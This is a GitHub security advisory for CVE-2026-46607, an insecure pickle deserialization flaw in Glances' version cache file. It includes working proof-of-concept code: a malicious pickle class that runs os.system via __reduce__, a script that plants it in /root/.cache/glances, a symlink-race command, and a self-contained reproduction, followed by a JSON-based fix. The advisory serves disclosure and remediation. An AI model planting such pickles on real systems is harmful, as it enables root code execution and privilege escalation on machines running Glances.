# [H] Glances has Insecure Pickle Deserialization in its Version Cache that Leads to Arbitrary Code Execution

## Summary
Severity: High
Advisory: GHSA-9837-48hr-q32j
CVE: CVE-2026-46607
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-9837-48hr-q32j
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=0 <4.5.5

## Details
### Summary

`glances/outdated.py` uses `pickle.load()` to read a version-check cache file stored at a predictable, world-accessible path (`~/.cache/glances/glances-version.db` or `$XDG_CACHE_HOME/glances/glances-version.db`). No integrity check, signature verification, or format validation is performed before deserialization.  An attacker with write access to that path — through any of several realistic local or container-level scenarios — can plant a malicious pickle file and achieve arbitrary code execution as the OS user running Glances the next time it starts with version checking enabled (the default).

---

### Details

**Affected file:** `glances/outdated.py`, method `Outdated._load_cache()`, line 121

**Direct URL (commit 04579778e733d705898a169e049dc84772c852da):**
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121

```python
# outdated.py  (_load_cache, line 119-127)
try:
    with open(self.cache_file, 'rb') as f:
        cached_data = pickle.load(f)          # ← no integrity check
except Exception as e:
    logger.debug(f"Cannot read version from cache file: {self.cache_file} ({e})")
    ...
```

`self.cache_file` is constructed from the XDG cache directory path at `Outdated.__init__()`:

```python
# outdated.py  (__init__)
self.cache_file = os.path.join(
    user_cache_dir('glances')[0],
    'glances-version.db'
)
```

On a default Linux installation this resolves to `/home/john/.cache/glances/glances-version.db` (or `/root/.cache/glances/…` when Glances runs as root).

Python's `pickle` module is an execution-capable serialisation format: any class that implements `__reduce__` can embed an arbitrary callable and argument tuple that Python will invoke unconditionally at `pickle.load()` time.  There is no safe subset of pickle; the only safe mitigation is to not use it for untrusted data.

The code was verified on x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).  A malicious pickle crafted with `os.system()` via `__reduce__` executed the injected shell command successfully before the surrounding Python code raised a `TypeError`.

---

### PoC

**Special configuration required**

No non-default Glances configuration is needed.  Version checking is enabled by default (`check_update = true`).  The only pre condition is that the attacker can write to the Glances user's XDG cache directory — see the attack scenarios below for how this arises in practice.

---

**Attack scenario A — local privilege escalation (shared multi-user host)**

Prerequisites: Glances runs periodically (e.g. via systemd or cron) as a privileged user (root or a dedicated monitoring account).  The attacker is an unprivileged local user who has write access to the Glances user's `~/.cache/glances/` directory (e.g. the directory or an ancestor is group- or world-writable, or was created with overly permissive umask).

**Step 1 — Identify the cache path**

```bash
python3 -c "from glances.config import user_cache_dir; print(user_cache_dir()[0])"
# Example output: /root/.cache/glances
```

**Step 2 — Craft and plant a malicious pickle**

```python
import pickle, os, pathlib

class MaliciousPayload:
    def __reduce__(self):
        # This command runs as the Glances process user
        cmd = 'id >> /tmp/glances_rce_proof.txt'
        return (os.system, (cmd,))

cache_dir  = pathlib.Path('/root/.cache/glances')   # adjust to target
cache_file = cache_dir / 'glances-version.db'
cache_dir.mkdir(parents=True, exist_ok=True)
cache_file.write_bytes(pickle.dumps(MaliciousPayload()))
print(f'Payload written to {cache_file}')
```

**Step 3 — Wait for Glances to start (or restart it)**

Glances calls `_load_cache()` automatically at startup when `check_update = true` (the compiled-in default). No special configuration is required by the attacker.

**Step 4 — Verify execution**

```bash
cat /tmp/glances_rce_proof.txt
# uid=0(root) gid=0(root) groups=0(root)    ← output from the Glances-user context
```

---

**Attack scenario B — container / shared-volume poisoning**

A compromised container that shares a Docker/Podman volume with the Glances container can write to the cache path on the shared volume. The next time Glances restarts (e.g. after a rolling update), the payload executes inside the Glances container with its privileges.

---

**Attack scenario C — symlink race (TOCTOU)**

Before the Glances cache directory is created for the first time (e.g. on a fresh installation), an attacker with write access to `~/.cache/` can create a symlink:

```bash
mkdir -p /home/john/.cache
ln -s /tmp/attacker_controlled /home/john/.cache/glances
```

When Glances writes its legitimate cache file it writes instead to `/tmp/attacker_controlled/glances-version.db`, which the attacker can replace with the malicious pickle before the next start.

---

**Minimal self-contained reproduction**

```python
import sys, os, pickle, pathlib, argparse

sys.path.insert(0, '/path/to/glances')   # adjust to local clone

FAKE_CACHE = pathlib.Path('/tmp/glances_test_cache')
CACHE_FILE = FAKE_CACHE / 'glances-version.db'
FAKE_CACHE.mkdir(parents=True, exist_ok=True)

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo RCE_confirmed >> /tmp/glances_rce.txt',))

CACHE_FILE.write_bytes(pickle.dumps(Exploit()))

# Reproduce the exact Glances code path
from glances.outdated import Outdated
obj = object.__new__(Outdated)
obj.args = argparse.Namespace(disable_check_update=False, time=2)
obj.data = {}
obj.cache_file = str(CACHE_FILE)

try:
    obj._load_cache()            # pickle.load() fires here
except Exception:
    pass                         # expected: int not subscriptable

import time; time.sleep(0.2)
print(pathlib.Path('/tmp/glances_rce.txt').read_text())
# Prints: RCE_confirmed
```

---

### Impact

**Vulnerability type:** Insecure Deserialization (CWE-502)

**Who is impacted:** Any system where Glances is run with version checking enabled (the default) in a shared environment where a less-privileged process can write to the Glances user's XDG cache directory, or in any containerised deployment using shared volumes.

**Impact:**
- **Confidentiality:** Full — the attacker gains code execution in the context of the Glances process and can read any data accessible to that user.
- **Integrity:** Full — arbitrary commands can modify files, install persistence mechanisms, or alter system state.
- **Availability:** Full — the Glances process and, if running as root, the system can be disrupted.

On many deployments Glances is run as root (required to access hardware performance counters without specific capabilities), meaning successful exploitation yields full root code execution without any further privilege escalation step.

---

### Suggested Fix

Replace `pickle` with `json` for the version cache.  The data stored is a simple Python dictionary containing two string values and a `datetime` object; a JSON representation is straightforward:

```python
import json
from datetime import datetime

# Saving
with open(self.cache_file, 'w', encoding='utf-8') as f:
    json.dump({
        'installed_version': self.installed_version(),
        'latest_version':    latest,
        'refresh_date':      datetime.now().isoformat(),
    }, f)

# Loading
with open(self.cache_file, 'r', encoding='utf-8') as f:
    cached_data = json.load(f)
    cached_data['refresh_date'] = datetime.fromisoformat(cached_data['refresh_date'])
```

If pickle is retained for any reason, the cache file must be protected with an HMAC keyed from a Glances-managed secret (e.g. a random key stored in the Glances config directory, which should itself be mode 0600).

As an additional hardening measure, restrict the permissions of the Glances cache directory to 0700 at creation time.

---

### Responsible Disclosure

The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.

---

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

---

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j
- https://nvd.nist.gov/vuln/detail/CVE-2026-46607
- https://github.com/advisories/GHSA-9837-48hr-q32j
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.5
- https://github.com/pypa/advisory-database/tree/main/vulns/glances/PYSEC-2026-2496.yaml
- https://pypi.org/project/glances
